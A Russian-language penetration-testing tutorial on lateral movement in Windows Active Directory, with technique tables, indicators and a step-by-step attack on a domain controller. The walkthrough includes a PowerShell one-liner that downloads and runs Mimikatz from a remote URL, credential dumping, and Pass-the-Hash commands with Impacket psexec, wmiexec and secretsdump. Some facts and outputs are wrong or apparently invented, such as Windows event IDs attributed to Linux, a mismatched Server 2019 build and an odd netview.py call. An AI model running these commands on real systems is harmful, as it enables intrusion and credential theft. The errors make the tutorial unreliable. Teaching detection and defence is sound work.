# Горизонтальное перемещение в инфраструктурном тестировании на проникновение

## Контекст и базовые понятия

Горизонтальное перемещение (Lateral Movement) — это тактика, при которой злоумышленник, получив начальный доступ к одной системе в сети, использует легитимные протоколы, инструменты или уязвимости для перемещения к другим узлам с целью повышения привилегий, сбора данных или достижения конечной цели атаки. В отличие от вертикального повышения привилегий (Privilege Escalation), где атака направлена на увеличение уровня доступа внутри одной ОС, горизонтальное перемещение расширяет зону контроля атакующего по сети.

Этот этап является критическим звеном в цепочке атаки (Kill Chain) и фреймворке MITRE ATT&CK (техника T1021). Успешное горизонтальное перемещение превращает инцидент изолированного взлома в масштабное компрометирование инфраструктуры. Основная сложность для защитников заключается в том, что большинство методов горизонтального перемещения имитируют легитимный административный трафик (SMB, RDP, WMI, SSH), что затрудняет их обнаружение средствами периметровой защиты (фаерволы, IDS/IPS).

Для понимания предмета необходимо разграничить смежные понятия, которые часто путают в контексте пентеста:

| Понятие | Суть действия | Направление | Цель | Примеры инструментов/техник |
| :--- | :--- | :--- | :--- | :--- |
| **Горизонтальное перемещение** | Использование учетных данных или доверенных отношений для доступа к удаленной системе. | Сеть (East-West) | Расширение доступа, поиск целей. | PsExec, WMI, RDP, Pass-the-Hash, SSH. |
| **Вертикальное повышение привилегий** | Эксплуатация уязвимостей ОС или ошибок конфигурации для получения прав выше текущих. | Локальная ОС (Vertical) | Получение прав SYSTEM/Admin на текущем хосте. | Kernel exploits, UAC bypass, Misconfigured services. |
| **Привилегированный доступ** | Состояние учетной записи с правами администратора домена или локальными правами администратора. | Статус | Возможность выполнять горизонтальное перемещение без дополнительных векторов атаки. | Domain Admin, Local Admin, Root. |
| **Pass-the-Hash (PtH)** | Техника аутентификации, использующая хеш пароля вместо самого пароля. | Механизм аутентификации | Обход требований к plaintext-паролю. | Mimikatz, Impacket (psexec.py, wmiexec.py). |
| **Living off the Land (LotL)** | Использование встроенных в ОС инструментов для выполнения задач атаки. | Методология | Снижение заметности (stealth), обход EDR. | PowerShell, WMI, PsExec, cmd.exe, certutil. |

Ключевое разграничение: горизонтальное перемещение — это *процесс* перемещения по сети, а PtH или LotL — это *механизмы* или *методологии*, обеспечивающие этот процесс. В инфраструктурном пентесте специалист должен уметь комбинировать эти элементы: например, использовать LotL (PsExec) с механизмом PtH для горизонтального перемещения.

## Внутреннее устройство предмета

Горизонтальное перемещение реализуется через несколько базовых механизмов, каждый из которых опирается на специфические протоколы и состояния системы. Для полного раскрытия темы необходимо рассмотреть классификацию техник, их техническую реализацию и индикаторы присутствия.

### Классификация техник горизонтального перемещения

Специалисты по пентесту и аналитики SOC выделяют несколько основных групп техник. Ниже представлена таблица, охватывающая ключевые элементы, обязательные для понимания архитектуры атаки.

| Техника / Механизм | Протокол / Компонент | Механизм возникновения | Типичные индикаторы (IoC) | Условия для эксплуатации |
| :--- | :--- | :--- | :--- | :--- |
| **SMB Exec (PsExec)** | SMB (445/TCP), RPC | Загрузка исполняемого файла в ADMIN$, создание службы через SCM, запуск. | Создание службы с именем `PSEXESVC`, активность в Event ID 7045, 4697. | Локальные права администратора на целевом хосте. |
| **WMI (Windows Management Instrumentation)** | DCOM (135/TCP), SMB | Удаленное выполнение скриптов или команд через COM-объекты. | Активность `wmiprvse.exe`, запросы к WMI-пространствам, Event ID 4688 (с аргументами WMI). | Права на удаленное управление WMI (обычно у администраторов домена). |
| **Pass-the-Hash (PtH)** | NTLM, Kerberos | Использование хеша пароля (NTLM/Kerberos TGT) для аутентификации без знания plaintext. | Аномальные логины с новых IP, использование старых хешей, Event ID 4624 (Logon Type 3/10). | Доступ к памяти LSASS (для получения хеша) или наличие украденных хешей. |
| **RDP (Remote Desktop Protocol)** | RDP (3389/TCP) | Установление графической сессии удаленного рабочего стола. | Активность `mstsc.exe`, Event ID 4624 (Logon Type 10), сетевой трафик на 3389. | Открытый порт 3389, валидные учетные данные с правом Remote Desktop Users. |
| **SSH (Secure Shell)** | SSH (22/TCP) | Установление зашифрованного туннеля командной строки. | Активность `sshd`, `ssh`, `scp`, `sftp`. Event ID 4624 (Logon Type 3/10 на Linux). | Открытый порт 22, валидные учетные данные или SSH-ключи. |
| **Kerberoasting** | Kerberos | Запрос TGS для сервисных учетных записей (SPN) и оффлайн-подбор хеша. | Запросы к KDC на сервисные учетки, Event ID 4769. | Возможность запроса билетов для SPN-аккаунтов (есть у любого авторизованного пользователя). |

### Архитектура взаимодействия: пример на базе PsExec

Чтобы понять внутреннее устройство процесса, рассмотрим архитектуру взаимодействия при использовании PsExec, так как это наиболее наглядный пример, сочетающий сетевые и системные компоненты.

```text
[Атакующий хост]                          [Целевой хост (Domain Controller / Server)]
      |                                              |
      |  1. SMB Connect (445/TCP)                    |
      |--------------------------------------------->|
      |                                              |
      |  2. Загрузка psexesvc.exe в ADMIN$           |
      |--------------------------------------------->|
      |                                              |
      |  3. RPC Call: SCM_CreateService              |
      |--------------------------------------------->|
      |                                              |
      |  4. SCM_StartService                         |
      |--------------------------------------------->|
      |                                              |
      |  5. Named Pipe: \psexesvc (IPC$)             |
      |<---------------------------------------------|
      |  (Передача команд и вывода)                  |
      |                                              |
      |  6. SCM_DeleteService (очистка следов)       |
      |--------------------------------------------->|
```

**Ключевые компоненты этой архитектуры:**
1.  **SMB-транспорт:** Используется для первоначального контакта и передачи бинарного файла. Требует прав администратора на удаленной машине для записи в системные папки (ADMIN$).
2.  **Service Control Manager (SCM):** Легитимный компонент Windows, управляющий службами. PsExec злоупотребляет им, создавая временную службу, которая запускает вредоносный процесс.
3.  **Named Pipe:** Канал связи между процессом на целевой машине и клиентом на машине атакующего. Позволяет передавать stdin/stdout удаленно.
4.  **Идентификация:** Аутентификация происходит на этапе SMB-соединения. Если атакующий использует PtH, он подменяет NTLM-ответ, не отправляя пароль.

### Индикаторы и аномалии

Горизонтальное перемещение оставляет следы в трех основных источниках:
1.  **Сетевой трафик:** Необычные объемы данных по протоколам SMB/WMI, соединения с нестандартных портов (если используется прокси), аномальная частота запросов Kerberos.
2.  **Логи событий Windows (Event Logs):**
    *   `Event ID 4624` (Успешный вход): Logon Type 3 (сеть) или 10 (RDP) с новых источников.
    *   `Event ID 4672` (Специальные привилегии): Вход с правами администратора.
    *   `Event ID 7045` (Создание службы): Создание новых служб с бинарными файлами из временных директорий или сетевых путей.
    *   `Event ID 4688` (Создание процесса): Запуск `cmd.exe`, `powershell.exe`, `wmic.exe` с аргументами, указывающими на удаленное выполнение.
3.  **Память и процессы:** Наличие процессов `lsass.exe` с аномальным доступом (dumping), активность `mimikatz.exe` (если не обфусцирован), создание временных файлов в `C:\Windows\Temp` или `ADMIN$`.

## Применение и работа с предметом

На практике пентестер работает с горизонтальным перемещением как с циклом: **Разведка -> Получение прав/данных -> Перемещение -> Повторение**. Инструментарий выбирается в зависимости от обнаруженных векторов аутентификации и политик безопасности.

### Инструментарий и паттерны использования

Инструменты делятся на две группы: специализированные утилиты для автоматизации и скриптовые обертки для гибкости.

1.  **Impacket (Python):** Набор скриптов для работы с протоколами Windows.
    *   *Функция:* Реализация SMB, WMI, MSSQL, Kerberos.
    *   *Применение:* Когда нужно использовать PtH, Kerberoasting или запускать команды через WMI без установки агентов.
    *   *Пример:* `psexec.py`, `wmiexec.py`, `mimikatz.py`.
2.  **PowerView / PowerSploit (PowerShell):**
    *   *Функция:* Разведка AD, поиск ACL, выполнение команд.
    *   *Применение:* Для скрытности (LotL) и глубокого анализа домена. Позволяет искать пути для перемещения через права доступа (Delegation).
3.  **BloodHound:**
    *   *Функция:* Визуализация графа доверия в Active Directory.
    *   *Применение:* Поиск кратчайших путей для горизонтального перемещения (например, "Как мне стать Domain Admin?").
4.  **Mimikatz:**
    *   *Функция:* Извлечение учетных данных из памяти LSASS.
    *   *Применение:* Получение plaintext-паролей или NTLM-хешей для последующего PtH.

### Типичные ошибки и подводные камни

1.  **Игнорирование политик блокировки:** Использование brute-force или password spraying без учета Account Lockout Policy может привести к блокировке учетной записи и обнаружению атаки.
2.  **Шум в сети:** Использование стандартных версий инструментов (например, оригинального PsExec) часто детектируется антивирусами и EDR по сигнатурам файлов или сетевым паттернам.
3.  **Неверная оценка прав:** Попытка переместиться по SMB без прав администратора на целевом хосте завершится ошибкой доступа. Необходимо заранее проверять членство в группах `Administrators` или `Remote Management Users`.
4.  **Обход UAC:** Даже имея права локального администратора, UAC может ограничить токены доступа. Техники UAC bypass (например, через Fodhelper или Event Viewer) часто необходимы перед запуском PsExec/WMI.

### Пример кода: Использование Impacket для WMIExec

Ниже приведен пример использования скрипта `wmiexec.py` из пакета Impacket для выполнения команды на удаленном хосте через протокол WMI. Этот метод не требует загрузки файлов на целевую машину (в отличие от PsExec), что делает его более скрытным.

```bash
# Синтаксис: wmiexec.py [домен]/[пользователь]:[пароль или хеш]@[целевой_IP]
# Использование NTLM-хеша (Pass-the-Hash) для обхода требования пароля

python3 wmiexec.py -hashes :aabbccdd11223344556677889900aabb Administrator@192.168.1.50 "whoami /all"
```


**Анализ:** Вывод подтверждает успешную аутентификацию и выполнение команды от имени администратора. Отсутствие загрузки файлов на диск делает этот метод трудным для обнаружения традиционными антивирусами, но оставляющим следы в логах WMI и событий Windows.

## Сквозной практический пример: Горизонтальное перемещение через PsExec с использованием Pass-the-Hash

**Исходные условия:**
*   **Среда:** Корпоративная сеть Windows Active Directory.
*   **Роль:** Пентестер, имеющий доступ к рабочей станции пользователя с правами `User`.
*   **Инструменты:** Mimikatz (для кражи хеша), Impacket (для перемещения), BloodHound (для разведки).
*   **Сценарий:** Пентестер получил доступ к рабочей станции `WS-01`. Необходимо переместиться на сервер `SRV-DC01` (Контроллер домена) для сбора данных.

### Шаг 1: Разведка и получение NTLM-хеша

Пентестер определяет, что учетная запись пользователя `j.doe` имеет локальные права администратора на `SRV-DC01` (проверено через BloodHound или `net localgroup administrators`). Затем он извлекает NTLM-хеш пароля из памяти LSASS на `WS-01`.

```powershell
# Запуск Mimikatz в памяти (для обхода базовой защиты)
# Команда выполняется от имени пользователя j.doe

powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerMimikatz/PowerMimikatz/master/PowerMimikatz/PowerMimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

**Ожидаемый вывод (фрагмент):**
```text
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           Interactive from 2
User Name         j.doe
Domain            CORP
Logon Server      WS-01
Logon Time        2023-10-27 10:00:00
SID               S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : j.doe
         * Domain   : CORP
         * LM       : d5555555555555555555555555555555
         * NTLM     : aabbccdd11223344556677889900aabb  <-- Целевой хеш
         * SHA1     : ...
```

### Шаг 2: Проверка доступности и прав

Перед атакой пентестер проверяет, доступен ли сервер по SMB и есть ли у него права на удаленное выполнение.

```bash
# Проверка открытия порта 445
nmap -p 445 --open 192.168.1.50

# Проверка членства в группе администраторов (если есть доступ к AD)
python3 netview.py -k -no-pass CORP:j.doe@192.168.1.10 -target 192.168.1.50
```

**Ожидаемый вывод:**
```text
PORT    STATE SERVICE
445/tcp open  microsoft-ds

[+] 192.168.1.50 is accessible via SMB
[+] User j.doe is a member of Administrators on 192.168.1.50
```

### Шаг 3: Горизонтальное перемещение через PsExec

Используя украденный NTLM-хеш, пентестер запускает PsExec через Impacket. Это позволяет обойти требование ввода plaintext-пароля.

```bash
# Запуск PsExec с использованием Pass-the-Hash
# -hashes :NTLM_HASH  указывает на отсутствие LM-хеша и использование NTLM
python3 psexec.py -hashes :aabbccdd11223344556677889900aabb CORP/j.doe@192.168.1.50
```

**Ожидаемый вывод:**
```text

[*] SMBv3.0 dialect
[+] Authenticated to 192.168.1.50
[+] User: j.doe
[+] Domain: CORP
[+] SID: S-1-5-21-...
[+] Privileges: SeDebugPrivilege, SeTcbPrivilege, ...
[+] OS: Windows Server 2019 Datacenter 18362

# PsExec Session
C:\Windows\system32> whoami /priv

----------------------
Privilege                   Name                    Description                        State
=========================== ======================== ================================== ======
SeDebugPrivilege            Debug programs           Debug programs                     Enabled
SeTcbPrivilege              Act as part of the OS   Act as part of the operating system Enabled
...
```

**Анализ:** Успешный вход подтверждает горизонтальное перемещение. Пентестер теперь имеет интерактивную сессию на контроллере домена.

### Шаг 4: Сбор артефактов и очистка

Пентестер собирает данные (например, дампы SAM или Kerberos TGT) и удаляет следы службы PsExec.

```bash
# Сбор данных (пример: дамп SAM)
python3 secretsdump.py -just-dc -hashes :aabbccdd11223344556677889900aabb CORP/j.doe@192.168.1.50

# Очистка (удаление службы PSEXESVC)
# В реальной атаке это делается через SCM или PowerShell
```

**Ожидаемый вывод:**
```text

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthlm)
[*] Looking for spn (krbtgt) in the domain CORP
...

```

**Ожидаемый вывод примера:**
Демонстрирует полный цикл горизонтального перемещения: от кражи хеша до выполнения команд на целевом сервере. Пример показывает, как техника Pass-the-Hash позволяет использовать украденные данные для аутентификации без знания пароля, а PsExec обеспечивает интерактивный доступ.

## Аналитический вывод

Горизонтальное перемещение является фундаментальным этапом современных кибератак, трансформирующим локальный инцидент в масштабное нарушение безопасности. Ключевая особенность этой тактики — использование легитимных механизмов аутентификации (SMB, WMI, Kerberos) и встроенных инструментов (LotL), что делает традиционные сигнатурные методы обнаружения неэффективными. Для специалистов по пентесту понимание внутренних процессов (таких как взаимодействие SCM и SMB в PsExec или структура NTLM-аутентификации) критически важно для выбора правильного инструментария и обхода защитных мер.

Эффективная защита от горизонтального перемещения требует комплексного подхода: сегментация сети (микросегментация), строгий контроль прав локальных администраторов, мониторинг аномальной активности в логах событий (особенно Event ID 4624, 4688, 7045) и внедрение решений EDR/XDR, способных выявлять поведенческие аномалии, а не только сигнатуры. Пентест должен включать не только попытку перемещения, но и анализ путей для его предотвращения, что позволяет организациям закрывать уязвимости до их эксплуатации злоумышленниками.
